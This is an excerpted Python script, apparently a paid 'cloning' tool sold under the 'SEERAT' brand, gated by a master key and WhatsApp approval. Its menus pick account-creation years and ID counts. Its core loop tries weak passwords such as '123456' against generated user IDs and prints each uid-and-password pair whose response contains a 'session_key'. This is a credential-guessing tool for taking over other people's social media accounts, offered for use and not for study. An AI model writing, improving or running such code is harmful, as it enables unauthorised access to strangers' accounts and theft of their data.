...
{RESET}
{color}{BOLD}👑 SEERAT PREMIUM CLONING TOOL 🖤🦅 THANKS FOR CONNECTING US{RESET}
"""
    print(art)
    print(f"{GREEN}╔══════════════════════════════════════╗{RESET}")
...
def approval_check_online():
    ...
    # Ask if user has master key
    print(f"{YELLOW}Do you have a master key? (y/n): {RESET}", end="")
    has_master = input().strip().lower()
    
    if has_master in ['y', 'yes']:
        master_input = input(f"{CYAN}Enter Master Key: {RESET}").strip()
        if master_input == MASTER_KEY:
            success_box("Master Key Verified! Always Approved 🎉")
            return True
        else:
            fail_box("Invalid Master Key!")
            time.sleep(1)

    # ✅ Direct pass for master key (in case device key matches)
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            if final_key in approved_keys or partial_match:
                ...
                message = f"🌟 Hello Seerat mam please 🌟\nMy name is {user_name}\nPlease approve my key:\n🔑 {final_key}"
                ...
                whatsapp_url = f"https://wa.me/919234735585?text={encoded_message}"
                
                print(f"\n{CYAN}📱 Opening WhatsApp for approval request...{RESET}")
                ...
                if opened:
                    print(f"{GREEN}✅ WhatsApp opened! Send the message to get approval.{RESET}")
                else:
                    print(f"{YELLOW}📱 Could not auto-open WhatsApp. Please manually send this message:{RESET}")
                    print(f"{CYAN}{message}{RESET}")
                    print(f"\n{YELLOW}WhatsApp Number: +919234735585{RESET}")
            ...
            print(f"\n{RED}❌ Cannot connect to approval server. Access denied.{RESET}")
            return False

    except Exception as e:
        fail_box(f"Connection error: {str(e)}")
        print(f"\n{RED}❌ Cannot verify approval. Access denied.{RESET}")
        return False
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【S E E R A T】𓆪 \x07')
...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                                                
 DEVELOPER ➤ SEERAT BRAND                        
 WATSAPP   ➤ +919234735585   
 VERSION   ➤ 2.0                  
 TOOLS     ➤ OLD CLONING
 APPROVAL  ➤ ONLY PAID            
\033[0m""")
...
def year_2015():
    ...
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mYEAR {Y}:{G} 2015")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
...
def year_2016_2017():
    ...
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mYEAR {Y}:{G} 2016-2017")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
...
def year_2018_2020():
    ...
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mYEAR {Y}:{G} 2018-2020")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
...
def year_2021_2022():
    ...
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mYEAR {Y}:{G} 2021-2022")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
...
def year_2023_2024():
    ...
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mYEAR {Y}:{G} 2023-2024")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSEERAT\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
...
if __name__ == '__main__':
    ...
    if approval_check_online():
        ...
        print(f"\n{RED}❌ Exiting... Please get approval first.{RESET}")
        sys.exit(1)
